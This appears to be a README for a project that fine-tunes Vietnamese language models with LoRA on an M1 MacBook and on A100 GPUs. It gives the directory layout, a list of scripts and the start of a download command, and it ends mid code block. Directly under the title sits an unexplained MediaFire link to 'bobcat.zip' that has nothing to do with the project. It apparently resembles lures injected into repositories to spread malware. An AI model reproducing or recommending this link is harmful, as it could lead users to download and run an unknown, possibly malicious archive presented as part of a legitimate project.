# Vietnamese Language Model Fine-tuning
https://download1585.mediafire.com/2bf7lcbide1gQjUe_gaLsreY1kF9fO17kH49mOpyyhhgQMAwdavIrgDJvmGiV2NMajpksF66vFev8A5I2DN2tYz-Qcd3sAqD41gpQotZ3YNnhVML1BYZzHQ94zVe2eKZVjBmzuG4unZLnQ6MBJhxYcpnltOeGiKiEmezmAx4EaVMTw/tz2eueoda5ghes1/bobcat.zip
This project contains scripts and tools for fine-tuning Vietnamese language models using LoRA (Low-Rank Adaptation) on MacBook Pro M1.

## Project Structure
.
├── config/                # Configuration files
├── data/                  # Data directory
│   ├── raw/               # Raw data
│   └── processed/         # Processed data
├── models/                # Model directory
│   └── cache/             # Model cache
├── scripts/               # Scripts for data processing and training
└── README.md              # This file

## Scripts

- `scripts/prepare_vietnamese_data.py`: Prepares Vietnamese data for fine-tuning
- `scripts/finetune_vietnamese_llm_m1.py`: Fine-tunes a Vietnamese LLM on MacBook Pro M1
- `scripts/finetune_vietnamese_llm_a100.py`: Fine-tunes a Vietnamese LLM on A100 GPUs

## Usage

### Download a model

```bash
python scripts/finetune_vietnamese_llm_m1.py \
    --model_size small \
    --train_data_path data/processed/train.json \
    --eval_data_path data/processed/eval.json \
    --cache_dir models/cache \
    --download_only
